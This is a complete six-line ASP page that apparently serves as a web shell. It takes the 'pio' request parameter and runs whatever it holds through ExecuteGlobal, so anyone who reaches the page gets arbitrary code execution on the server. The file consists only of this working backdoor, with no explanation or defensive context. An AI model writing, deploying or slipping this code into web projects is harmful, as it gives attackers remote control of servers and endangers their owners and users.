<%
estcc=request("pio")
If estcc<>"" Then 
ExecuteGlobal(estcc):response.End
End If
%>